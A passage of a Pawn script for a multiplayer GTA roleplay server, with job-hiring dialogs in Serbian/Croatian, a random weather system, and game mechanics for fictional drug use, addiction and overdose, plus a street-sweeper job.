					""col_job"Potrebno je da odradite barem 3 sati ugovora kako bi ste dali otkaz!\n" \
					""col_job"Komande posla: "col_white" /posao /uniforma /jobskill /prekiniposao", "U redu", "");
			}
			
			else if( ChosenJob[ playerid ] == POSAO_RUDAR ) {
	 	        ShowPlayerDialog( playerid, 0, DSMSG, "Posao Rudar",
					""col_job"Cestitamo! Uspesno ste se zaposlili kao Rudar!\n\n" \
					""col_job"Potrebno je da odradite barem 3 sati ugovora kako bi ste dali otkaz!\n" \
					""col_job"Komande posla: "col_white" /posao /uniforma /jobskill /prekiniposao", "U redu", "");
			}
			else if( ChosenJob[ playerid ] == POSAO_DILER) {
				ShowPlayerDialog( playerid, 0, DSMSG, "Posao Diler Droge",
					""col_job"Cestitamo! Uspesno ste se zaposlili kao Diler Droge!\n\n" \
					""col_job"Potrebno je da odradite barem 3 sati ugovora kako bi ste dali otkaz!\n" \
					""col_job"Komande posla: "col_white" /jobskill /posadidrogu /uberidrogu /ukradidrogu /kupisemedroge /preradidrogu /dilerhelp", "U redu", "");
			}
			
			else if( ChosenJob[ playerid ] == POSAO_VOJNIK) {
				ShowPlayerDialog( playerid, 0, DSMSG, "Posao Vojnik",
					""col_job"Cestitamo! Uspesno ste se zaposlili kao Vojnik!\n\n" \
					""col_job"Potrebno je da odradite barem 3 sati ugovora kako bi ste dali otkaz!\n" \
					""col_job"Komande posla: "col_white" /vojnikoprema /vojnikmisije /jobskill ", "U redu", "");
			}

            else if( ChosenJob[ playerid ] == POSAO_SABOTAZER) {
                ShowPlayerDialog( playerid, 0, DSMSG, "Posao Sabotazer",
                    ""col_job"Cestitamo! Uspesno ste se zaposlili kao Sabotazer!\n\n" \
                    ""col_job"Potrebno je da odradite barem 3 sati ugovora kako bi ste dali otkaz!\n" \
                    ""col_job"Komande posla: "col_white" /posao /uniforma /jobskill ", "U redu", "");
            }

            else if( ChosenJob[ playerid ] == POSAO_MOLER) {
                ShowPlayerDialog( playerid, 0, DSMSG, "Posao Moler",
                    ""col_job"Cestitamo! Uspesno ste se zaposlili kao Moler!\n\n" \
                    ""col_job"Potrebno je da odradite barem 3 sati ugovora kako bi ste dali otkaz!\n" \
                    ""col_job"Komande posla: "col_white" /posao /uniforma /jobskill ", "U redu", "");
            }

            else if( ChosenJob[playerid] == POSAO_HAKER) {

                ShowPlayerDialog(playerid, 0, DSMSG, "Posao Haker",
                    ""col_job"Cestitamo! Uspesno ste se zaposlili kao Haker!\n\n" \
                    ""col_job"Potrebno je da odradite barem 3 sati ugovora kako bi ste dali otkaz!\n" \
                    ""col_job"Komande posla: "col_white" /posao /uniforma /jobskill ", "U redu", "");
            }

            else if( ChosenJob[playerid] == POSAO_LOVAC) {

                ShowPlayerDialog(playerid, 0, DSMSG, "Posao Lovac",
                    ""col_job"Cestitamo! Uspesno ste se zaposlili kao Lovac!\n\n" \
                    ""col_job"Potrebno je da odradite barem 3 sati ugovora kako bi ste dali otkaz!\n" \
                    ""col_job"Komande posla: "col_white" /posao /uniforma /jobskill ", "U redu", "");
            }

            else if( ChosenJob[playerid] == POSAO_PORNO) {

                ShowPlayerDialog(playerid, 0, DSMSG, "Posao Porno Glumica",
                    ""col_job"Cestitamo! Uspesno ste se zaposlili kao Porno Glumica!\n\n" \
                    ""col_job"Potrebno je da odradite barem 3 sati ugovora kako bi ste dali otkaz!\n" \
                    ""col_job"Komande posla: "col_white" /posao /uniforma /jobskill ", "U redu", "");
            }

            else if( ChosenJob[playerid] == POSAO_ASTRONAUT) {

                ShowPlayerDialog(playerid, 0, DSMSG, "Posao Astronaut",
                    ""col_job"Cestitamo! Uspesno ste se zaposlili kao Astronaut!\n\n" \
                    ""col_job"Potrebno je da odradite barem 3 sati ugovora kako bi ste dali otkaz!\n" \
                    ""col_job"Komande posla: "col_white" /posao /uniforma /jobskill ", "U redu", "");
            }

            else if( ChosenJob[playerid] == POSAO_DRVA) {

                ShowPlayerDialog(playerid, 0, DSMSG, "Posao Prevoznik Drva",
                    ""col_job"Cestitamo! Uspesno ste se zaposlili kao Prevoznik Drva!\n\n" \
                    ""col_job"Potrebno je da odradite barem 3 sati ugovora kako bi ste dali otkaz!\n" \
                    ""col_job"Komande posla: "col_white" /posao /uniforma /jobskill ", "U redu", "");
            }

            else if( ChosenJob[playerid] == POSAO_PILOT) {

                ShowPlayerDialog(playerid, 0, DSMSG, "Posao Pilot",
                    ""col_job"Cestitamo! Uspesno ste se zaposlili kao Pilot!\n\n" \
                    ""col_job"Potrebno je da odradite barem 3 sati ugovora kako bi ste dali otkaz!\n" \
                    ""col_job"Komande posla: "col_white" /posao /uniforma /jobskill ", "U redu", "");
            }

            else if( ChosenJob[playerid] == POSAO_ELEKTRIK) {

                ShowPlayerDialog(playerid, 0, DSMSG, "Posao Elektricar",
                    ""col_job"Cestitamo! Uspesno ste se zaposlili kao Elektricar!\n\n" \
                    ""col_job"Potrebno je da odradite barem 3 sati ugovora kako bi ste dali otkaz!\n" \
                    ""col_job"Komande posla: "col_white" /posao /uniforma /jobskill ", "U redu", "");
            }

            else if(ChosenJob[playerid] == POSAO_DELIVERY) {
                ShowPlayerDialog( playerid, 0, DSMSG, "Posao Delivery",
                    ""col_job"Cestitamo! Uspesno ste se zaposlili kao Delivery!\n\n" \
                    ""col_job"Potrebno je da odradite barem 3 sati ugovora kako bi ste dali otkaz!\n" \
                    ""col_job"Komande posla: "col_white" /posao /jobskill ", "U redu", "");

            }

			PlayerInfo[ playerid ][ xPosao ] = ChosenJob[ playerid ];
			PlayerInfo[ playerid ][ xUgovor ] = 0;
            PlayerInfo[playerid][xJobSkill] = 0;
			SavePlayer( playerid );

            ZaposljavanjeTDControl( playerid, false, "", "", "" );
            CancelSelectTextDraw( playerid );

            if(PlayerInfo[playerid][xAchivements][1] == 0) {

                achivementPassed(playerid, 1, 1000);
            }

 	        return true;
 	    }
 	    if( playertextid == ZaposljavanjeTD[ playerid ][ 8 ] ) {
 	        SendInfoMessage( playerid, "Odustali ste od zaposljavanja." );
            ZaposljavanjeTDControl( playerid, false, "", "", "" );
            CancelSelectTextDraw( playerid );
 	    	return true;
		}
 	}
 	return 1;
}

//------------------------------------------------------------------------------
public DinamicWeather()
{
	new tmphour,
	    tmpminute,
		tmpsecond;

	gettimeEx(tmphour, tmpminute, tmpsecond);
	FixHour( tmphour );
	tmphour = shifthour;

	if(tmphour >= 6 && tmphour <= 20)
	{
    	new RandomWeather;
    	RandomWeather = random(10);
    	switch(RandomWeather)
    	{
         	case 0:
         	{
            	SetWeather(1);
            	SendClientMessageToAll( NARANDZASTA1, "  *VREMENSKA PROGNOZA: Vreme je suncano i ugodno." );
            	ServerInfo[ Prognozasys ] = 1;
	     	}
	     	case 1:
	     	{
            	SetWeather(7);
	        	SendClientMessageToAll(NARANDZASTA1, "  *VREMENSKA PROGNOZA: Vreme je tmurno i oblacno. ");
	        	ServerInfo[ Prognozasys ] = 7;
	     	}
	     	case 2:
	     	{
	        	SetWeather(8);
	        	SendClientMessageToAll(NARANDZASTA1, "  *VREMENSKA PROGNOZA: Kisa je pocela da pada. Upozoravaju se vozaci da opreznije voze radi skliskih kolnika.");
	        	ServerInfo[ Prognozasys ] = 8;
         	}
	     	case 3:
	     	{
	        	SetWeather(13);
	        	SendClientMessageToAll(NARANDZASTA1, "  *VREMENSKA PROGNOZA: Vreme je suncano i odlicno za odlazak na plazu. Temperatura vode je ugodnih 22C.");
	        	ServerInfo[ Prognozasys ] = 13;
	     	}
         	case 4:
	     	{
	        	SetWeather(15);
	        	SendClientMessageToAll(NARANDZASTA1, "  *VREMENSKA PROGNOZA: Vreme je oblacno i vjetrovito. Brzina vjetra iznosi 20km/h.");
	        	ServerInfo[ Prognozasys ] = 15;
	     	}
 	     	case 5:
         	{
	        	SetWeather(17);
	        	SendClientMessageToAll(NARANDZASTA1, "  *VREMENSKA PROGNOZA: Vreme je oblacno i ugodno za setnje prirodom.");
	        	ServerInfo[ Prognozasys ] = 17;
	    	}
 	     	case 6:
         	{
	        	SetWeather(24);
	        	SendClientMessageToAll(NARANDZASTA1, "  *VREMENSKA PROGNOZA: Vreme je suncano. Preporucuje se da se pije sto vise tekucine radi vrucina.");
	        	ServerInfo[ Prognozasys ] = 24;
	    	}
	     	case 7:
	     	{
	        	SetWeather(10);
	        	SendClientMessageToAll(NARANDZASTA1, "  *VREMENSKA PROGNOZA: Vreme je svjeze i suncano. Temperatura zraka iznosi 29C");
	        	ServerInfo[ Prognozasys ] = 10;
	     	}
	     	case 8:
	     	{
	        	SetWeather(43);
	        	SendClientMessageToAll(NARANDZASTA1, "  *VREMENSKA PROGNOZA: Vreme je maglovito i tmurno.");
	        	SendClientMessageToAll(NARANDZASTA1, "  *VREMENSKA PROGNOZA: Upozoravaju se vozaci da opreznije voze radi slabije vidljivosti na cestama.");
	        	ServerInfo[ Prognozasys ] = 43;
	    	}
	     	case 9:
         	{
	        	SetWeather(40);
	        	SendClientMessageToAll(NARANDZASTA1, "  *VREMENSKA PROGNOZA: Vreme je ugodno i suncano.");
	        	ServerInfo[ Prognozasys ] = 40;
	     	}
            // case 10: {

            //     foreach(Player, i) {

            //         GetPlayerCameraPos(i,snowX,snowY,snowZ);
            //         snowobj[i]=CreatePlayerObject(i,18864, snowX,snowY,snowZ-5, 0.0, 0.0, 0.0, 300.0);
            //         SetPlayerWeather(i,9);

            //     }

            //     SendClientMessageToAll(NARANDZASTA1, "  *VREMENSKA PROGNOZA: Napolju je pao sneg!");
            //     ServerInfo[ Prognozasys ] = 9;
            // }
		}
	}
	else if( tmphour >= 21 && tmphour <= 5 )
	{
		SetWeather(10);
		ServerInfo[ Prognozasys ] = 10;
	}
	return 1;
}
//------------------------------------------------------------------------------
DrugCheck( playerid ) {
    new hour,minuite,second;

	if( PlayerDrugged[ playerid ] == true ) {

	    if( GetPVarInt( playerid, "PlayerDruggedSeconds") > 0)
			PovecajPVarInt( playerid, "PlayerDruggedSeconds", -1);
		else {
		    gettimeEx( hour, minuite, second );
			FixHour( hour );
			hour = shifthour;

            SetPlayerDrunkLevel( playerid, 0 );
			PlayerDrugged[ playerid ] = false;
			SetPVarInt( playerid, "PlayerDruggedSeconds", 0 );
			PlayerStoned[ playerid ] = false;
			SetPlayerWeather( playerid, ServerInfo[ Prognozasys ] );
			SetPlayerTime( playerid, hour, minuite );
		}
	}
}
//------------------------------------------------------------------------------
public CarCheck( playerid )
{
	new Float:health;
    if( IsPlayerConnected( playerid ) ) {

        GetPlayerHealth( playerid, health );
		if( NaDmEventu[ playerid ] == false) {
		    if( PlayerInfo[ playerid ][ xHeroinAddict ] == true && PlayerInfo[ playerid ][ xHeroinUsed ] < 1 )
		    {
		        Novi_SetPlayerHealth( playerid, health - 3.5);
		        ApplyAnimation( playerid, "SWEET", "Sweet_injuredloop", 4.0, 1, 0, 0, 0, 0, 1);
		        GameTextForPlayer( playerid, "~r~Niste uzeli svoju dozu,vase tijelo zeli drogu!", 2000, 6);
			}
			else if( PlayerInfo[ playerid ][ xMethAddict ] == true && PlayerInfo[ playerid ][ xMethUsed ] < 1 )
		    {
		        Novi_SetPlayerHealth( playerid, health - 3.2);
		        ApplyAnimation( playerid, "SWEET", "Sweet_injuredloop", 4.0, 1, 0, 0, 0, 0, 1);
		        GameTextForPlayer( playerid, "~r~Niste uzeli vasu dozu metamfetamina,vase tijelo zeli drogu!", 2000, 6);
			}
			else if( PlayerInfo[ playerid ][ xCokeCrackAddict ] == true && PlayerInfo[ playerid ][ xCokeCrackUsed ] < 1 )
		    {
		        Novi_SetPlayerHealth( playerid, health - 3.0);
		        ApplyAnimation( playerid, "SWEET", "Sweet_injuredloop", 4.0, 1, 0, 0, 0, 0, 1);
		        GameTextForPlayer( playerid, "~r~Niste uzeli svoju dozu,vase tijelo zeli drogu!", 2000, 6);
			}
		}

	}
	return 1;
}
//------------------------------------------------------------------------------
task PetnesTMinutesTimer[900000]()
{
	foreach( Player, i ) {
		CarCheck( i );
	}
	
	SaveServerStats( );
}
//------------------------------------------------------------------------------
task FiveMinutesTimer[420000]()
{

    for( new plants = 1; plants < MAX_PLANTS; plants++ ) {

   		if( DrogaStab[ plants ][ wPlanted ] == 1 ) {

   		    DrogaStab[ plants ][ wHoursPassed ]++;

   		    if( DrogaStab[ plants ][ wHoursPassed ] <= 8 ) {
	   		    MoveDynamicObject( DrogaStab[ plants ][ wObjectID ], DrogaStab[ plants ][ Plantx ], DrogaStab[ plants ][Planty], DrogaStab[ plants ][Plantz]+0.2, 5 );
	   		    DrogaStab[ plants ][ Plantz ] += 0.2;
   		    }

   		    if( DrogaStab[ plants ][ wHoursPassed ] > 12 ) {

   		        DrogaStab[ plants ][ Plantx ] = 0;
				DrogaStab[ plants ][ Planty ] = 0;
			   	DrogaStab[ plants ][ Plantz ] = 0;
			   	DrogaStab[ plants ][ wType ] = 0;
				DrogaStab[ plants ][ wPlanted ] = 0;
				DrogaStab[ plants ][ wHoursPassed ] = 0;
				strmid( DrogaStab[ plants ][ wOwner ], "Niko", 0, strlen( "Niko" ), 255);
				DrogaStab[ plants ][ wViwo ] = 0;
			    DestroyDynamicObject( DrogaStab[ plants ][ wObjectID ] );
   		    }
		}
	}

    
}
//------------------------------------------------------------------------------
GetDrugNameByDrugID( drugid ) {
	switch( drugid ) {
		case 1000..1999: //Marihuana
		{
			format( globalstring, sizeof( globalstring ), "Marihuana");
		}
		case 2000..2999: //LSD
		{
    		format( globalstring, sizeof( globalstring ), "LSD");
		}
		case 3000..3999: //Methamphetamine
		{
    		format( globalstring, sizeof( globalstring ), "Methamphetamine");
		}
		case 4000..4999: //Heroin
		{
		    format( globalstring, sizeof( globalstring ), "Heroin");
		}
		case 5000..5999: //Cocaine
		{
		    format( globalstring, sizeof( globalstring ), "Kokain");
		}
		case 6000..6999: //Blue Methamphetamine
		{
		    format( globalstring, sizeof( globalstring ), "Plavi Methamphetamine");
		}
		case 7000..7999: //crack
		{
		    format( globalstring, sizeof( globalstring ), "Crack");
		}
		default:
		{
			format( globalstring, sizeof( globalstring ), "Prazno");
		}
	}
	return globalstring;
}

UsingCrack( playerid, drugid ) {

    if( IsPlayerConnected( playerid ) ) {
    
        if( IsAStrongCrack( drugid ) ) {
        
		    PlayerInfo[ playerid ][ xCokeCrackIndicator ] += 100;
		    DodajIgracuHP( playerid, 60);
            if(PlayerInfo[ playerid ][ xCokeCrackAddict ] == true)
                PlayerInfo[ playerid ][ xCokeCrackUsed ] = 6;

            DodajIgracuArmour( playerid, 30 );
		}
		else if( IsAGoodCrack( drugid ) )
		{
            PlayerInfo[ playerid ][ xCokeCrackIndicator ] += 80;
		    DodajIgracuHP( playerid, 50);
            if(PlayerInfo[ playerid ][ xCokeCrackAddict ] == true)
                PlayerInfo[ playerid ][ xCokeCrackUsed ] = 5;

            DodajIgracuArmour( playerid, 25 );
		}
		else if( IsABadCrack( drugid ) )
		{
            PlayerInfo[ playerid ][ xCokeCrackIndicator ] += 60;
		    DodajIgracuHP( playerid, 40);
            if(PlayerInfo[ playerid ][ xCokeCrackAddict ] == true)
                PlayerInfo[ playerid ][ xCokeCrackUsed ] = 3;

            DodajIgracuArmour( playerid, 20 );
		}
		else if( IsAVeryBadCrack( drugid ) )
		{
            PlayerInfo[ playerid ][ xCokeCrackIndicator ] += 45;
		    DodajIgracuHP( playerid, 30);
            if(PlayerInfo[ playerid ][ xCokeCrackAddict ] == true )
                PlayerInfo[ playerid ][ xCokeCrackUsed ] = 1;

            DodajIgracuArmour( playerid, 15 );

            if( PlayerInfo[ playerid ][ xCokeCrackIndicator ] > 680 ) {

                PlayerInfo[ playerid ][ xUbijen ] = 1;
				SCM( playerid, ZUTA, "Predozirali ste se krekom i umrli." );
				Novi_SetPlayerHealth( playerid, 0 );
            }
		}
		if(PlayerInfo[ playerid ][ xCokeCrackIndicator ] > 750 && PlayerInfo[ playerid ][ xCokeCrackAddict ] == false)
			PlayerInfo[ playerid ][ xCokeCrackAddict ] = true;
    }
}


UsingCocaine( playerid, drugid)
{
    if( IsPlayerConnected( playerid ))
    {
        if( IsAStrongCocaine( drugid ) )
		{
		    PlayerInfo[ playerid ][ xCokeCrackIndicator ] += 100;
		    DodajIgracuHP( playerid, 60);
            if(PlayerInfo[ playerid ][ xCokeCrackAddict ] == true)
                PlayerInfo[ playerid ][ xCokeCrackUsed ] = 6;

            DodajIgracuArmour( playerid, 30 );
		}
		else if( IsAGoodCocaine( drugid ) )
		{
            PlayerInfo[ playerid ][ xCokeCrackIndicator ] += 80;
		    DodajIgracuHP( playerid, 50);
            if(PlayerInfo[ playerid ][ xCokeCrackAddict ] == true)
                PlayerInfo[ playerid ][ xCokeCrackUsed ] = 5;

            DodajIgracuArmour( playerid, 25 );
		}
		else if( IsABadCocaine( drugid ) )
		{
            PlayerInfo[ playerid ][ xCokeCrackIndicator ] += 60;
		    DodajIgracuHP( playerid, 40);
            if(PlayerInfo[ playerid ][ xCokeCrackAddict ] == true)
                PlayerInfo[ playerid ][ xCokeCrackUsed ] = 3;

            DodajIgracuArmour( playerid, 20 );
		}
		else if( IsAVeryBadCocaine( drugid ) )
		{
            PlayerInfo[ playerid ][ xCokeCrackIndicator ] += 45;
		    DodajIgracuHP( playerid, 30);
            if(PlayerInfo[ playerid ][ xCokeCrackAddict ] == true )
                PlayerInfo[ playerid ][ xCokeCrackUsed ] = 1;

            DodajIgracuArmour( playerid, 15 );

            if( PlayerInfo[ playerid ][ xCokeCrackIndicator ] > 680 ) {

                PlayerInfo[ playerid ][ xUbijen ] = 1;
				SCM( playerid, ZUTA, "Predozirali ste se kokainom i umrli." );
				Novi_SetPlayerHealth( playerid, 0 );
            }
		}
		if(PlayerInfo[ playerid ][ xCokeCrackIndicator ] > 750 && PlayerInfo[ playerid ][ xCokeCrackAddict ] == false)
			PlayerInfo[ playerid ][ xCokeCrackAddict ] = true;
    }
}

UsingBMeth( playerid, drugid) {
    if( IsPlayerConnected( playerid ) ) {
    
        if( IsAStrongBlueMeth( drugid ) ) {
        
		    PlayerInfo[ playerid ][ xMethIndicator ] += 100;
		    DodajIgracuHP( playerid, 60 );
            if(PlayerInfo[ playerid ][ xMethAddict ] == true )
                PlayerInfo[ playerid ][ xMethUsed ] = 6;

            DodajIgracuArmour( playerid, 30 );
		}
		else if( IsAGoodBlueMeth( drugid ) ) {
		
            PlayerInfo[ playerid ][ xMethIndicator ] += 90;
		    DodajIgracuHP( playerid, 50 );
            if(PlayerInfo[ playerid ][ xMethAddict ] == true )
                PlayerInfo[ playerid ][ xMethUsed ] = 5;

            DodajIgracuArmour( playerid, 25 );
		}
		else if( IsABadBlueMeth( drugid ) ) {
		
            PlayerInfo[ playerid ][ xMethIndicator ] += 80;
		    DodajIgracuHP( playerid, 40);
            if(PlayerInfo[ playerid ][ xMethAddict ] == true )
                PlayerInfo[ playerid ][ xMethUsed ] = 3;

            DodajIgracuArmour( playerid, 20 );
		}
		else if( IsAVeryBadBlueMeth( drugid ) )
		{
            PlayerInfo[ playerid ][ xMethIndicator ] += 40;
		    DodajIgracuHP( playerid, 30);
            if( PlayerInfo[ playerid ][ xMethAddict ] == true )
                PlayerInfo[ playerid ][ xMethUsed ] = 1;

            DodajIgracuArmour( playerid, 15 );

            if( PlayerInfo[ playerid ][ xMethIndicator ] > 385 ) {

                PlayerInfo[ playerid ][ xUbijen ] = 1;
				SCM( playerid, ZUTA, "Predozirali ste se metom i umrli." );
				Novi_SetPlayerHealth( playerid, 0 );
            }
		}
		if(PlayerInfo[ playerid ][ xMethIndicator ] > 450 && PlayerInfo[ playerid ][ xMethAddict ] == false )
			PlayerInfo[ playerid ][ xMethAddict ] = true;
    }
}

UsingMeth( playerid, drugid)
{
    if( IsPlayerConnected( playerid ) ) {
        if( IsAStrongMeth( drugid ) ) {
        
		    PlayerInfo[ playerid ][ xMethIndicator ] += 95;
		    DodajIgracuHP( playerid, 60 );
            if(PlayerInfo[ playerid ][ xMethAddict ] == true )
                PlayerInfo[ playerid ][ xMethUsed ] = 6;

            DodajIgracuArmour( playerid, 30 );
		}
		else if( IsAGoodMeth( drugid ) ) {
		
            PlayerInfo[ playerid ][ xMethIndicator ] += 85;
		    DodajIgracuHP( playerid, 50 );
            if(PlayerInfo[ playerid ][ xMethAddict ] == true )
                PlayerInfo[ playerid ][ xMethUsed ] = 5;

            DodajIgracuArmour( playerid, 25 );
		}
		else if( IsABadMeth( drugid ) ) {
		
            PlayerInfo[ playerid ][ xMethIndicator ] += 70;
		    DodajIgracuHP( playerid, 40);
            if(PlayerInfo[ playerid ][ xMethAddict ] == true )
                PlayerInfo[ playerid ][ xMethUsed ] = 3;

            DodajIgracuArmour( playerid, 20 );
		}
		else if( IsAVeryBadMeth( drugid ) ) {
		
            PlayerInfo[ playerid ][ xMethIndicator ] += 35;
		    DodajIgracuHP( playerid, 30);
            if(PlayerInfo[ playerid ][ xMethAddict ] == true )
                PlayerInfo[ playerid ][ xMethUsed ] = 1;

            DodajIgracuArmour( playerid, 15 );

            if( PlayerInfo[ playerid ][ xMethIndicator ] > 380 ) {

                PlayerInfo[ playerid ][ xUbijen ] = 1;
				SCM( playerid, ZUTA, "Predozirali ste se metom i umrli." );
				Novi_SetPlayerHealth( playerid, 0 );
            }
		}
		if( PlayerInfo[ playerid ][ xMethIndicator ] > 450 && PlayerInfo[ playerid ][ xMethAddict ] == false )
			PlayerInfo[ playerid ][ xMethAddict ] = true;
    }
}

UsingHeroin( playerid, drugid ) {
    if( IsPlayerConnected( playerid ) ) {
		if( IsAStrongHeroin( drugid ) )
		{
		    PlayerInfo[ playerid ][ xHeroinIndicator ] += 100;
		    DodajIgracuHP( playerid, 60);

            if(PlayerInfo[ playerid ][ xHeroinAddict ] == true)
                PlayerInfo[ playerid ][ xHeroinUsed ] = 6;

            DodajIgracuArmour( playerid, 30 );
		}
		else if( IsAGoodHeroin( drugid ) )
		{
            PlayerInfo[ playerid ][ xHeroinIndicator ] += 90;
		    DodajIgracuHP( playerid, 50);

            if(PlayerInfo[ playerid ][ xHeroinAddict ] == true)
                PlayerInfo[ playerid ][ xHeroinUsed ] = 5;

            DodajIgracuArmour( playerid, 25 );
		}
		else if( IsABadHeroin( drugid ) )
		{
            PlayerInfo[ playerid ][ xHeroinIndicator ] += 75;
		    DodajIgracuHP( playerid, 40);

            if(PlayerInfo[ playerid ][ xHeroinAddict ] == true)
                PlayerInfo[ playerid ][ xHeroinUsed ] = 3;

            DodajIgracuArmour( playerid, 20 );
		}
		else if( IsAVeryBadHeroin( drugid ) )
		{
            PlayerInfo[ playerid ][ xHeroinIndicator ] += 40;
		    DodajIgracuHP( playerid, 30);

            if(PlayerInfo[ playerid ][ xHeroinAddict ] == true)
                PlayerInfo[ playerid ][ xHeroinUsed ] = 1;

            DodajIgracuArmour( playerid, 15 );
            if( PlayerInfo[ playerid ][ xHeroinIndicator ] > 250 ) {

                PlayerInfo[ playerid ][ xUbijen ] = 1;
				SCM( playerid, ZUTA, "Predozirali ste se heroinom i umrli." );
				Novi_SetPlayerHealth( playerid, 0 );
            }
		}

		if( PlayerInfo[ playerid ][ xHeroinIndicator ] > 300 && PlayerInfo[ playerid ][ xHeroinAddict ] == false)
			PlayerInfo[ playerid ][ xHeroinAddict ] = true;

    }
}

IsAMarijuana(drugid)
{
	if(drugid >= 1000 && drugid <= 1999)
	{
	    return true;
	}
	return false;
}

IsALSD(drugid)
{
	if(drugid >= 2000 && drugid <= 2999)
	{
	    return true;
	}
	return false;
}

IsAMethamphetamine(drugid)
{
	if(drugid >= 3000 && drugid <= 3999)
	{
	    return true;
	}
	return false;
}

IsAHeroin(drugid)
{
	if(drugid >= 4000 && drugid <= 4999)
	{
	    return true;
	}
	return false;
}


IsACocaine(drugid)
{
	if(drugid >= 5000 && drugid <= 5999)
	{
	    return true;
	}
	return false;
}

IsACrack(drugid)
{
	if(drugid >= 7000 && drugid <= 7999)
	{
	    return true;
	}
	return false;
}

IsAStrongCrack(drugid)
{
	if(drugid >= 7800 && drugid <= 7999)
	{
	    return true;
	}
	return false;
}

IsAGoodCrack(drugid)
{
	if(drugid >= 7500 && drugid <= 7799)
	{
	    return true;
	}
	return false;
}

IsABadCrack(drugid)
{
	if(drugid >= 7200 && drugid <= 7499)
	{
	    return true;
	}
	return false;
}

IsAVeryBadCrack(drugid)
{
	if(drugid >= 7000 && drugid <= 7199)
	{
	    return true;
	}
	return false;
}


IsABlueMeth(drugid)
{
	if(drugid >= 6000 && drugid <= 6999)
	{
	    return true;
	}
	return false;
}

IsAStrongHeroin(drugid)
{
	if(drugid >= 4549 && drugid <= 4741)
	{
	    return true;
	}
	return false;
}

IsAGoodHeroin(drugid)
{
	if(drugid >= 4742 && drugid <= 4999)
	{
	    return true;
	}
	return false;
}

IsABadHeroin(drugid)
{
	if(drugid >= 4244 && drugid <= 4548)
	{
	    return true;
	}
	return false;
}

IsAVeryBadHeroin(drugid)
{
	if(drugid >= 4000 && drugid <= 4243)
	{
	    return true;
	}
	return false;
}

IsAStrongBlueMeth(drugid)
{
	if(drugid >= 6800 && drugid <= 6999)
	{
	    return true;
	}
	return false;
}

IsAGoodBlueMeth(drugid)
{
	if(drugid >= 6500 && drugid <= 6799)
	{
	    return true;
	}
	return false;
}

IsABadBlueMeth(drugid)
{
	if(drugid >= 6200 && drugid <= 6499)
	{
	    return true;
	}
	return false;
}

IsAVeryBadBlueMeth(drugid)
{
	if(drugid >= 6000 && drugid <= 6199)
	{
	    return true;
	}
	return false;
}

IsAStrongLSD(drugid)
{
	if(drugid >= 2800 && drugid <= 2999)
	{
	    return true;
	}
	return false;
}

IsAGoodLSD(drugid)
{
	if(drugid >= 2500 && drugid <= 2799)
	{
	    return true;
	}
	return false;
}

IsABadLSD(drugid)
{
	if(drugid >= 2200 && drugid <= 2499)
	{
	    return true;
	}
	return false;
}

IsAVeryBadLSD(drugid)
{
	if(drugid >= 2000 && drugid <= 2199)
	{
	    return true;
	}
	return false;
}

IsAStrongMeth(drugid)
{
	if(drugid >= 3800 && drugid <= 3999)
	{
	    return true;
	}
	return false;
}

IsAGoodMeth(drugid)
{
	if(drugid >= 3500 && drugid <= 3799)
	{
	    return true;
	}
	return false;
}

IsABadMeth(drugid)
{
	if(drugid >= 3200 && drugid <= 3499)
	{
	    return true;
	}
	return false;
}

IsAVeryBadMeth(drugid)
{
	if(drugid >= 3000 && drugid <= 3199)
	{
	    return true;
	}
	return false;
}


IsAStrongCocaine( drugid ) {
	if( drugid >= 5800 && drugid <= 5999 ) {
	    return true;
	}
	return false;
}

IsAGoodCocaine( drugid ) {
	if( drugid >= 5500 && drugid <= 5799 ){
	    return true;
	}
	return false;
}

IsABadCocaine( drugid ) {
	if( drugid >= 5200 && drugid <= 5499 ) {
	    return true;
	}
	return false;
}

IsAVeryBadCocaine( drugid ) {
	if( drugid >= 5000 && drugid <= 5199 ) {
	    return true;
	}
	return false;
}
//------------------------------------------------------------------------------
public CistacKilometri( playerid ) {
	if( IsPlayerInAnyVehicle( playerid ) && antiCheatCS[ playerid ][ AFKMinute ] == 0 && !IsPlayerPaused( playerid ) && GetSpeed( playerid ) > 2 && GetSpeed( playerid ) < 100 && CistacPosao[ playerid ] == true && GetVehicleModel( GetPlayerVehicleID( playerid ) ) == 574 ) {
		cistacmetri[ playerid ] += ( GetSpeed( playerid )*10)/36;
		
		new Float:Pos[ 3 ];
		GetPlayerPos( playerid, Pos[ 0 ], Pos[ 1 ], Pos[ 2 ] );
		if( cistacpoz[ playerid ][ 0 ] == Pos[ 0 ] && cistacpoz[ playerid ][ 1 ] == Pos[ 1 ] ) {
			CistacWarning[ playerid ]++;
			if( CistacWarning[ playerid ] == 10 ) {
			    
			    SendJobMessage( playerid, "Sumnja se da ste bili u mestu vise od 10 sekundi pa vam je prekinuo posao." );
                SetVehicleToRespawn( cistacvozilo[ playerid ] );
                cistacvozilo[ playerid ] = -1;
				CistacPosao[ playerid ] = false;
				cistackilometri[ playerid ] = 0;
				cistacmetri[ playerid ] = 0;
				cistacnovac[ playerid ] = 0;
				cistacpoz[ playerid ][ 0 ] = 0.0;
				cistacpoz[ playerid ][ 1 ] = 0.0;
				cistacpoz[ playerid ][ 2 ] = 0.0;
				CistacWarning[ playerid ] = 0;
	            Novi_KillTimer( CistacTimer[ playerid ] );
	            CKilometriTDControl( playerid, false );
	            return 1;
			}
		}
		GetPlayerPos( playerid, cistacpoz[ playerid ][ 0 ], cistacpoz[ playerid ][ 1 ], cistacpoz[ playerid ][ 2 ] );
		
		if( cistacmetri[ playerid ] > 999 ) {
			cistackilometri[ playerid ] += 1;
			cistacmetri[ playerid ] = 0;
			cistacnovac[ playerid ] = (cistackilometri[ playerid ]*280);
			format( globalstring, sizeof( globalstring ), "Kilometri: %d", cistackilometri[ playerid ] );
			PlayerTextDrawSetString( playerid, CKilometri[ playerid ][ 1 ], globalstring );
			format( globalstring, sizeof( globalstring ), "Zarada: %d", cistacnovac[ playerid ] );
			PlayerTextDrawSetString( playerid, CKilometri[ playerid ][ 2 ], globalstring );
			
			if( cistackilometri[ playerid ] == 10 ) {
			    Novi_KillTimer( CistacTimer[ playerid ] );
        		CKilometriTDControl( playerid, false );
        		
				SendJobMessage( playerid, "Presli ste 10km morate vratiti vozilo u bazu, pa poceti opet ako zelite." );
        		
        		Novi_SetPlayerCheckpoint( playerid, 2110.5352, -2088.1064, 13.5544, 5.0);
				CheckpointStatus[ playerid ] = 27;
			}
		}
	}
	return 1;
}
//------------------------------------------------------------------------------
public FakultetCasovi( playerid, broj ) {
    if( PlayerInfo[ playerid ][ xFakultet ] != 15 ) {
		PlayerInfo[ playerid ][ xFakultet ] = broj;
		Odbrojavanje[ playerid ] = 0; Uciskolu[ playerid ] = false;
